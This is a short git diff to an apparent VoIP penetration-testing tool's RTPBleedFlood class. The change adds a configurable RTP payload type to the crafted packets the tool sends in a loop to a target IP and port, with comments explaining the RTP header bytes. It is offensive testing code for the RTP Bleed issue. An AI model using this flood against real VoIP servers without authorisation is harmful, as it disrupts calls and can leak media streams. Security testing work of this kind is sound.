@@ -38,12 +38,15 @@ class RTPBleedFlood:
     def __init__(self):
         self.ip = ''
         self.port = ''
+        self.payload = '0'
 
     def start(self):
         self.port = int(self.port)
+        self.payload = int(self.payload)
 
         print(BWHITE + '[!] Target IP: ' + YELLOW + '%s' % self.ip)
         print(BWHITE + '[!] Target port:' + YELLOW + ' %d' % self.port)
+        print(BWHITE + '[!] Payload type: ' + YELLOW + '%d' % self.payload)
         print(WHITE)
 
         print(YELLOW + '[+] Sending RTP packets to %s:%d' %
@@ -65,7 +68,11 @@ class RTPBleedFlood:
                 nloop += 1
                 cloop = hex(nloop)[2:]
                 cloop = cloop.zfill(4)
-                message = ('8080'+cloop+'0000000000000000')
+                cpayload = '%s' % hex(0x80 | self.payload & 0x7F)[2:]
+                # byte[0] = 0x80 => RTP version 2
+                # byte[1] = 0x80+payload => Codec version (https://en.wikipedia.org/wiki/RTP_payload_formats)
+                # byte[2-3] = Sequence number
+                message = ('80'+cpayload+cloop+'0000000000000000')
                 byte_array = bytearray.fromhex(message)
 
                 if nloop == 65535:
